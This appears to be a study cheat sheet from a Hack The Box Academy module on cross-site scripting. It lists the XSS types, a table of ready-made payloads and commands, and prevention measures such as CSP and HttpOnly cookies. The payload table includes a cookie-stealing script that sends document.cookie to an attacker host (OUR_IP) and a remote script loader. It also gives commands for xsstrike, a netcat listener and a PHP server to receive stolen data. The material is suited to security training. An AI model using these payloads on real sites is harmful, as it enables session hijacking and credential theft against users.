## Types of XSS

There are three main types of XSS vulnerabilities:

| Type | Description |
| ----- | ----- |
| Stored (Persistent) XSS | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments) |
| Reflected (Non-Persistent) XSS | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message) |
| DOM-based XSS	Another Non-Persistent | XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |


## Commands

| Code | Description |
| ----- | ----- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server |

## Prevention

Front-end + Back-end = Input Validation + Input Sanitization (=DOMPurify Library)

In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:

- Using HTTPS across the entire domain
- Using XSS prevention headers, like X-XSS-Protection.
- Using the appropriate Content-Type for the page, like X-Content-Type-Options=nosniff.
- Using Content-Security-Policy options, like script-src 'self', which only allows locally hosted scripts.
- Using the HttpOnly and Secure cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

In addition to the above, having a good Web Application Firewall (WAF) can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests.
